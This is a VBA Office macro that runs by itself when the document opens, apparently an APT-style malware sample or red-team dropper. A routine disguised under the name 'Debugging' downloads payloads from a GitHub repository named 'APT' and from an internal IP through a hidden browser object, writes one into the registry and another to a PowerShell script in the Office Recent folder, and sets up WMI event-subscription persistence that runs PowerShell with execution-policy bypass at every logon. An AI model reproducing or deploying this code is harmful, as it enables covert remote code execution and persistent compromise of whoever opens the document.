Public Runs As Boolean
Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As LongPtr)
Sub Auto_Open()
    
    Call Debugging
    
End Sub
Sub AutoOpen()

    Call Debugging

End Sub
Sub Document_Open()

    Call Debugging

End Sub
Private Function WMIPersistence(ByVal exePath As String, ByVal taskName As String) As Boolean
    Dim filterName, consumerName As String
    Dim objLocator, objService1
    Dim objInstances1, objInstances2, objInstances3
    Dim newObj1, newObj2, newObj3
    
    On Error GoTo Failed
    
    filterName = taskName & " Event"
    consumerName = taskName & " Consumer"
    
    Set objLocator = CreateObject("WbemScripting.SWbemLocator")
    Set objService1 = objLocator.ConnectServer(".", "root\subscription")

    Set objInstances1 = objService1.Get("__EventFilter")

    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"

    Set newObj1 = objInstances1.Spawninstance_
    newObj1.Name = filterName
    newObj1.eventNamespace = "root\cimv2"
    newObj1.QueryLanguage = "WQL"
    newObj1.Query = Query
    newObj1.Put_
    
    Set objInstances2 = objService1.Get("CommandLineEventConsumer")
    Set newObj2 = objInstances2.Spawninstance_
    newObj2.Name = consumerName
    newObj2.CommandLineTemplate = exePath
    newObj2.Put_
    
    Set objInstances3 = objService1.Get("__FilterToConsumerBinding")
    Set newObj3 = objInstances3.Spawninstance_
    newObj3.Filter = "__EventFilter.Name=""" & filterName & """"
    newObj3.Consumer = "CommandLineEventConsumer.Name=""" & consumerName & """"
    newObj3.Put_
    
    WMIPersistence = True
    Exit Function
Failed:
    WMIPersistence = False

End Function
Private Function RegPayload(ByVal RegPath As String, ByVal RegValue As String) As Boolean
    
    Set wshShell = CreateObject("WScript.Shell")
    wshShell.regwrite RegPath, RegValue, "REG_SZ"
    
    On Error GoTo Failed
    RegPayload = True
    Exit Function
Failed:
    RegPayload = False
    
End Function
Private Function FilePayload(ByVal FileFullPath As String, ByVal ADSName As String, ByVal Payload As String)

    Dim fileSysObj
    Set fileSysObj = CreateObject("Scripting.FileSystemObject")
    Set fileObj = fileSysObj.CreateTextFile(FileFullPath)
    fileObj.WriteLine Payload
    fileObj.Close

End Function
Private Function GetByte(needle)
    Dim haystack
    haystack = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

    GetByte = InStr(1, haystack, needle, vbBinaryCompare) - 1
    If GetByte = -1 Then
        Err.Raise 513, "DecodeBase64", "Invalid character in base64 string"
    End If
End Function

Private Function DeBase64(strData)
    Dim i, inCount, outCount, firstTime
    Dim inArray(0 To 3) As Integer
    Dim outArray() As Byte

    If Len(strData) Mod 4 <> 0 Then
        Err.Raise 514, "DecodeBase64", "Base64 string length is wrong length"
    End If

    firstTime = True
    While Len(strData) > 0
    
        inCount = 0
        For i = 1 To 4
            If Mid(strData, i, 1) <> "=" Then
                inArray(i - 1) = GetByte(Mid(strData, i, 1))
                inCount = inCount + 1
            Else
                Exit For
            End If
        Next

        If Len(strData) > 4 And inCount <> 4 Then
            Err.Raise 515, "DecodeBase64", "Base64 string has interal '='"
        End If

        If inCount < 2 Then
            Err.Raise 516, "DecodeBase64", "Base64 string has invalid ending"
        End If


        outCount = inCount - 1
        If firstTime Then
            ReDim outArray(outCount - 1)
            firstTime = False
        Else
            ReDim Preserve outArray(UBound(outArray) + outCount)
        End If

        outArray(UBound(outArray) + 1 - outCount) = (inArray(0) And &H3F) * 4 + (inArray(1) And &H30) / 16
        If outCount >= 2 Then
            outArray(UBound(outArray) + 2 - outCount) = (inArray(1) And &HF) * 16 + (inArray(2) And &H3C) / 4
        End If
        If outCount >= 3 Then
            outArray(UBound(outArray) + 3 - outCount) = (inArray(2) And &H3) * 64 + (inArray(3) And &H3F)
        End If

        strData = Mid(strData, 5)
    Wend
    DeBase64 = StrConv(outArray, vbUnicode)
End Function
Private Function HTTPClient(ByVal xUrl As String, ByVal xLoop As Integer) As String
    Dim State As Integer
    Dim ie As Object
    Set ie = CreateObject("InternetExplorer.Application")
    Do Until xLoop = 1
        If xLoop = 2 Then
            Sleep 15000
        Else
            xLoop = 1
        End If
        ie.Navigate xUrl
        State = 0
        Do Until State = 4
           DoEvents: State = ie.readyState
        Loop
    Loop
    On Error GoTo Failed
    HTTPClient = ie.Document.Body.InnerText
    Exit Function
Failed:
    HTTPClient = False

End Function
Private Function Debugging() As Boolean
    
    If Runs = True Then GoTo Failed
    
    Dim Str, CurrentUserSid, PayloadConsumer, xrUrl, xfUrl, xRegKey, xFileFullPath, xFilePath, xFileName, xADSName, debugs As String
    xrUrl = "https://raw.githubusercontent.com/xia33F/APT/master/payloads/master_page"
    xfUrl = "https://raw.githubusercontent.com/xia33F/APT/master/payloads/wrapper_page"
    xFilePath = Environ("APPDATA") & "\Microsoft\Office\Recent\"
    xFileName = "tmpA7Z2.ps1"
    xFileFullPath = xFilePath & xFileName
    xADSName = "secret.txt"
    xRegKey = "HKEY_USERS\S-1-5-21-3921924719-2751751025-4067464375-1003\Software\RegisteredApplications\AppXs42fd12c3po92dynnq2r142fs12qhvsmyy"
    
    PayloadConsumer = "powershell.exe -noP -ep bypass iex -c ""('" & xFileFullPath & "')"""
    
    Call RegPayload(xRegKey, HTTPClient(xrUrl, 3))
    Call FilePayload(xFileFullPath, xADSName, HTTPClient(xfUrl, 3))
    Call WMIPersistence(PayloadConsumer, "LogRotate")
    
    debugs = HTTPClient("http://10.0.0.14/APT/fff.txt", 2)
    
    On Error GoTo Failed
    Debugging = True
    Runs = True
    Exit Function
Failed:
    Debugging = False

End Function


